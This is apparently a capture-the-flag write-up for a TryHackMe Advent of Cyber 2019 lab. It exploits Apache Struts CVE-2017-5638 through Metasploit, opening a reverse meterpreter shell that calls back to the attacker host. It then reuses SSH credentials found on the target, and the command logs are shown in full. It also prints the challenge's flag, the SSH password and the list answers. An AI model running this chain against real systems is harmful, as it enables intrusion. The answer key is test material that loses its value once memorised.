# This is the Write Up for day 10 challenge of Advent of Cyber 2K19 CTF.

> Pratyush Prakhar (5#1NC#4N) - 12/10/2019

## Description

Hi Lindsey here. I've been a great Elf all year, but there was one incident and now I think I'm on Santa's naughty list.

What? You didn't think us elves got presents too? Well we do and we get first pick of the pressies!

Can you help me hack into Santa's system that keeps track of the naughty and nice people to see if I am on it?

`This challenge is all about your knowledge of known vulnerabilities and msfconsole (MetaSploit).`

## Solution

1. Let's do a quick service scan on the IP with rustscan. [All ports scan](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_10/rustscan/all.nmap) and [Main Scan](rustscan/main.nmap).

2. Shows that `Apache Tomcat` is running on port 80. Let's explore this webserver. Also, we have insight into a known vulnerability from this [blog](https://blog.tryhackme.com/metasploit/).
![](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_10/images/web.png)

3. We are greeted with `/showcase.action` page which is typically associated with the Apache Struts framework. Apache Struts is a free, open-source, MVC framework for creating elegant, modern Java web applications. This is further confirmed with the inclusion of struts js files marked for 2012. 
![](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_10/images/ps.png)
\
\
![](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_10/images/struts.png)

4. Let's look for exploits that are available for `struts` for 2012 or later. I will use Metasploit for it as the task is around it. You can use your own path child. We will be looking into the `CVE-2017-5638` which misuses the Jakarta plugins using OGNL expressions. All the information and steps to replicate can be found in this [article](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts#4-expression-language-injection). Let's get on the machine. 

```bash
msf6 > search struts
                                                                                                                                                                                                                  
Matching Modules                                                                                                                                                                                                  
================                                                                                                                                                                                                  
                                                                                                                                                                                                                  
   #   Name                                                     Disclosure Date  Rank       Check  Description                                                                                                    
   -   ----                                                     ---------------  ----       -----  -----------                                                                                                    
   0   exploit/multi/http/struts_default_action_mapper          2013-07-02       excellent  Yes    Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
   1   exploit/multi/http/struts_dev_mode                       2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_multi_eval_ognl               2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
   3   exploit/multi/http/struts2_namespace_ognl                2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   4   exploit/multi/http/struts2_rest_xstream                  2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
   5   exploit/multi/http/struts2_code_exec_showcase            2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   6   exploit/multi/http/struts_code_exec_classloader          2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   7   exploit/multi/http/struts_dmi_exec                       2016-04-27       excellent  Yes    Apache Struts Dynamic Method Invocation Remote Code Execution
   8   exploit/multi/http/struts2_content_type_ognl             2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
   9   exploit/multi/http/struts_code_exec_parameters           2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
   10  exploit/multi/http/struts_dmi_rest_exec                  2016-06-01       excellent  Yes    Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
   11  exploit/multi/http/struts_code_exec                      2010-07-13       good       No     Apache Struts Remote Command Execution
   12  exploit/multi/http/struts_code_exec_exception_delegator  2012-01-06       excellent  No     Apache Struts Remote Command Execution
   13  exploit/multi/http/struts_include_params                 2013-05-24       great      Yes    Apache Struts includeParams Remote Code Execution
   14  auxiliary/scanner/http/log4shell_scanner                 2021-12-09       normal     No     Log4Shell HTTP Scanner


Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/http/log4shell_scanner

msf6 > use 8
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8080                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      trYnjnLnrvV      no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               **************   yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS *********
RHOSTS => 10.10.250.226
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
TARGETURI => /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST *********************
LHOST => 10.17.88.193
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit 

[*] Started reverse TCP handler on *************** 
[*] Sending stage (3045380 bytes) to ***************
[*] Meterpreter session 1 opened (***************  -> *************** ) at 2023-11-14 21:26:44 +0530

meterpreter > sysinfo 
Computer     : 172.17.0.2
OS           : Debian 8.8 (Linux 4.14.146-93.123.amzn1.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid 
Server username: root
```

5. What better we are root. But something seems off. We can't do many things and many a files are missing. Are we in a container? Let's check.
    1. We are indeed in a container. Shown through limited processes, docker-env file and missing common file sin the directories of users.
    2. But we do find some legit [ssh-creds](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_10/ssh/web-root/ssh-creds.txt) lying around for santa as `ssh-creds.txt`. Let's try to reuse them for a shell ont he real box.
    3. Let's also get the `flag1` lying around in the container.

```bash
meterpreter > cd /home/santa/
meterpreter > ls -la
Listing: /home/santa
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  30    fil   2019-12-09 02:39:49 +0530  ssh-creds.txt

meterpreter > ps

Process List
============

 PID  PPID  Name            Arch    User  Path
 ---  ----  ----            ----    ----  ----
 1    0     java            x86_64  root  /usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java
 54   1     [sh]            x86_64  root
 58   1     [vxgfiCHuKxzV]  x86_64  root
 75   1     [NjlgQuDBpGk]   x86_64  root
 82   1     [YnFzWqxhOfe]   x86_64  root
 146  1     [ZlGHyYhVUyU]   x86_64  root
 151  1     wPqqXTVVv       x86_64  root  /usr/local/tomcat/wPqqXTVVv

meterpreter > cd /
meterpreter > ls -la
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2023-11-14 20:29:13 +0530  .dockerenv
040755/rwxr-xr-x  4096  dir   2017-06-23 08:09:16 +0530  bin
040755/rwxr-xr-x  4096  dir   2017-04-21 03:13:23 +0530  boot
040755/rwxr-xr-x  340   dir   2023-11-14 20:29:14 +0530  dev
040755/rwxr-xr-x  4096  dir   2017-07-04 05:32:27 +0530  docker-java-home
040755/rwxr-xr-x  4096  dir   2023-11-14 20:29:13 +0530  etc
040755/rwxr-xr-x  4096  dir   2019-12-09 02:29:06 +0530  flag-dir
040755/rwxr-xr-x  4096  dir   2019-12-09 02:38:30 +0530  home
040755/rwxr-xr-x  4096  dir   2017-07-04 05:32:27 +0530  lib
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  lib64
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  media
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  mnt
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  opt
040555/r-xr-xr-x  0     dir   2023-11-14 20:29:14 +0530  proc
040700/rwx------  4096  dir   2019-12-09 02:42:15 +0530  root
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  run
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  sbin
040755/rwxr-xr-x  4096  dir   2017-06-20 05:30:00 +0530  srv
040555/r-xr-xr-x  0     dir   2023-11-14 20:40:59 +0530  sys
041777/rwxrwxrwx  4096  dir   2019-12-09 02:31:40 +0530  tmp
040755/rwxr-xr-x  4096  dir   2017-07-04 05:31:39 +0530  usr
040755/rwxr-xr-x  4096  dir   2017-07-04 05:31:33 +0530  var

meterpreter > shell
Process 153 created.
Channel 2 created.
find / -type f -iname "*flag1*" 2>/dev/null
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
THM{*******************************}
```

6. We finally get into the real box (Is it. I did my research. you do yours!!). Let's now get our names from the `naughty_list.txt` and `nice_list.txt`.

```bash
[santa@ip-10-10-250-226 ~]$ ls -la
total 44
drwx------ 2 santa santa 4096 Dec  8  2019 .
drwxr-xr-x 4 root  root  4096 Dec  8  2019 ..
-rw------- 1 santa santa  326 Nov 14 16:05 .bash_history
-rw-r--r-- 1 santa santa   18 Aug 30  2017 .bash_logout
-rw-r--r-- 1 santa santa  193 Aug 30  2017 .bash_profile
-rw-r--r-- 1 santa santa  124 Aug 30  2017 .bashrc
-rw-rw-r-- 1 santa santa 2182 Dec  8  2019 naughty_list.txt
-rw-rw-r-- 1 santa santa 1447 Dec  8  2019 nice_list.txt
-rw------- 1 santa santa 9682 Dec  8  2019 .viminfo
[santa@ip-10-10-250-226 ~]$ pwd
/home/santa
[santa@ip-10-10-250-226 ~]$ whoami
santa
[santa@ip-10-10-250-226 ~]$ ls -la /
total 116
dr-xr-xr-x 25 root root  4096 Nov 14 14:56 .
dr-xr-xr-x 25 root root  4096 Nov 14 14:56 ..
-rw-r--r--  1 root root     0 Nov 14 14:56 .autofsck
-rw-r--r--  1 root root     0 Oct 23  2019 .autorelabel
dr-xr-xr-x  2 root root  4096 Oct 23  2019 bin
dr-xr-xr-x  4 root root  4096 Oct 23  2019 boot
drwxr-xr-x 11 root root  4096 Oct 23  2019 cgroup
drwxr-xr-x 16 root root  2780 Nov 14 14:59 dev
drwxr-xr-x 79 root root  4096 Nov 14 14:56 etc
drwxr-xr-x  4 root root  4096 Dec  8  2019 home
dr-xr-xr-x  7 root root  4096 Aug 26  2019 lib
dr-xr-xr-x 10 root root 12288 Oct 23  2019 lib64
drwxr-xr-x  2 root root  4096 Aug 26  2019 local
drwx------  2 root root 16384 Aug 26  2019 lost+found
drwxr-xr-x  2 root root  4096 Jan  6  2012 media
drwxr-xr-x  2 root root  4096 Jan  6  2012 mnt
drwxr-xr-x  3 root root  4096 Aug 26  2019 opt
dr-xr-xr-x 99 root root     0 Nov 14 14:56 proc
dr-xr-x---  3 root root  4096 Dec  8  2019 root
drwxr-xr-x  4 root root  4096 Oct 23  2019 run
dr-xr-xr-x  2 root root 12288 Oct 23  2019 sbin
drwxr-xr-x  2 root root  4096 Jan  6  2012 selinux
drwxr-xr-x  2 root root  4096 Jan  6  2012 srv
dr-xr-xr-x 13 root root     0 Nov 14 15:10 sys
drwxrwxrwt  3 root root  4096 Nov 14 15:47 tmp
drwxr-xr-x 13 root root  4096 Aug 26  2019 usr
drwxr-xr-x 19 root root  4096 Aug 26  2019 var
```

7. Particular lines can be extracted in following ways. Find your own. Take care.

```bash
[santa@ip-10-10-250-226 ~]$ head -148 naughty_list.txt | tail -1
******** *************
[santa@ip-10-10-250-226 ~]$ sed -n "52p" nice_list.txt 
********* ***********
```


## Brownie Points

1. Compromise the web server using Metasploit. What is flag1? - **THM{3ad96bb13ec963a5ca4cb99302b37e12}**.

2. Now you've compromised the web server, get onto the main system. What is Santa's SSH password?- **rudolphrednosedreindeer**.

3. Who is on line 148 of the naughty list? - **Melisa Vanhoose**.

4. Who is on line 52 of the nice list? - **Lindsey Gaffney**


## Extra Treats.

1. Naughty and Nice list of santa are [here](https://github.com/pratty010/CTF/blob/master/THM%20CTF/Advent%20of%20Cyber/2K19/day_10/ssh/santa). Check your name.





